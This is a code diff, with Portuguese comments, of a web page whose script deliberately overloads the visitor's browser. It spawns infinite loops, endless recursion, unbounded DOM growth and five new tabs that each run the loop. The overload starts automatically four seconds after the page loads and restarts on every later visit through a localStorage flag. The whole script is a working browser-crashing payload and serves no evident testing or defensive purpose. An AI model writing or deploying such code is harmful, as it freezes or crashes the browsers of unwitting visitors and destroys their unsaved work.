@@ -12,64 +12,75 @@
         }
     </style>
     <script>
-        // Função para sobrecarregar o navegador
-        function overload() {
+        // Método 1: Loop infinito
+        function overloadWithLoop() {
             while (true) {
-                console.log("Sobrecarregando...");
+                console.log("Sobrecarregando com loop infinito...");
             }
         }
 
-        // Função para abrir novas abas e sobrecarregar
+        // Método 2: Função recursiva
+        function overloadWithRecursion() {
+            setTimeout(function() {
+                console.log("Sobrecarregando com recursão...");
+                overloadWithRecursion();  // Chama a função novamente para criar recursão infinita
+            }, 1);  // Intervalo mínimo para forçar a recursão rápida
+        }
+
+        // Método 3: Manipulação excessiva do DOM
+        function overloadWithDOM() {
+            let i = 0;
+            while (true) {
+                let newElement = document.createElement('div');
+                newElement.classList.add('content');
+                newElement.innerHTML = `<h2>Elemento Gerado</h2><p>Elemento ${i++}</p>`;
+                document.body.appendChild(newElement);
+            }
+        }
+
+        // Método 4: Abertura de novas abas
         function openAndOverload() {
             for (let i = 0; i < 5; i++) {
                 let newWindow = window.open('', '_blank');
                 newWindow.document.write('<!DOCTYPE html><html><head><title>Sobrecarregando</title></head><body><h1>Esta aba está sobrecarregando o navegador.</h1></body></html>');
                 newWindow.document.close();
                 newWindow.onload = function() {
-                    overload();
+                    overloadWithLoop();  // Ou qualquer outro método de sobrecarga
                 };
             }
         }
 
-        // Função para criar conteúdo dinâmico
-        function createContent() {
-            const contentDiv = document.createElement('div');
-            contentDiv.classList.add('content');
-            contentDiv.innerHTML = `
-                <h2>Conteúdo Gerado</h2>
-                <p>Este é um conteúdo gerado dinamicamente para sobrecarregar o navegador.</p>
-            `;
-            document.body.appendChild(contentDiv);
+        // Método 5: Utilizando intervalos para realizar o processo de sobrecarga em diferentes tempos
+        function overloadWithIntervals() {
+            let interval = 1000;
+            let count = 0;
+            let overloadInterval = setInterval(function() {
+                console.log(`Sobrecarregando... ${count++}`);
+                if (count === 10) {
+                    clearInterval(overloadInterval);  // Para a sobrecarga após 10 iterações
+                }
+            }, interval);
         }
 
         // Função para iniciar a sobrecarga
         function startOverload() {
-            let interval = 9900; // Intervalo inicial de 9,9 segundos em milissegundos
-
-            // Função para multiplicar o conteúdo
-            function multiplyContent() {
-                createContent();
-                setTimeout(multiplyContent, interval);
-                interval = Math.max(100, interval - 100); // Diminui o intervalo em 100ms, com mínimo de 100ms
-            }
-
-            multiplyContent();
+            overloadWithLoop();  // Exemplo de uso de loop infinito
+            overloadWithRecursion();  // Exemplo de recursão infinita
+            overloadWithDOM();  // Exemplo de manipulação excessiva do DOM
+            openAndOverload();  // Abre novas abas com sobrecarga
+            overloadWithIntervals();  // Exemplo de sobrecarga com intervalos
         }
 
         // Verifica se a sobrecarga já foi iniciada
         function checkOverloadStatus() {
             if (localStorage.getItem('overloadStarted') === 'true') {
-                overload(); // Começa a sobrecarga automaticamente
-                openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
-                startOverload(); // Começa a multiplicação do conteúdo
+                startOverload();  // Começa a sobrecarga automaticamente
             } else {
                 // Inicia a sobrecarga após 4 segundos
                 setTimeout(function() {
-                    localStorage.setItem('overloadStarted', 'true'); // Marca que a sobrecarga foi iniciada
-                    overload(); // Começa a sobrecarga na aba atual
-                    openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
-                    startOverload(); // Começa a multiplicação do conteúdo
-                }, 4000); // Atraso de 4 segundos
+                    localStorage.setItem('overloadStarted', 'true');  // Marca que a sobrecarga foi iniciada
+                    startOverload();  // Inicia a sobrecarga
+                }, 4000);  // Atraso de 4 segundos
             }
         }
 
